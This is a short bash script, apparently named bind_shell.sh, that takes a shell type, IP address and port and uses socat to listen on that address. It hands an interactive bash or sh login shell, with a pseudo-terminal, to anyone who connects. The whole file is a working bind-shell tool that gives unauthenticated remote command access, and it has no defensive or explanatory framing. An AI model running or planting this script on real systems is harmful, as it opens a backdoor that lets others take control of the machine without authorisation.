#!/bin/bash

# USAGE: bash bind_shell.sh <SHELL> <IP> <PORT>

# Check if arguments are provided
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <SHELL> <IP> <PORT>"
    exit 1
fi

# Variables
SHELL_TYPE="$1"
IP="$2"
PORT="$3"

# Determine which shell to use
if [ "$SHELL_TYPE" = "bash" ]; then
    echo "Using bash shell..."
elif [ "$SHELL_TYPE" = "sh" ]; then
    echo "Using sh shell..."
else
    echo "Invalid shell specified. Exiting..."
    exit 1
fi

# Start the socat server
echo "Starting shell server on $IP:$PORT..."
socat TCP-LISTEN:"$PORT",bind="$IP",reuseaddr,fork EXEC:"$SHELL_TYPE -li",pty,stderr,setsid,sigint,sane
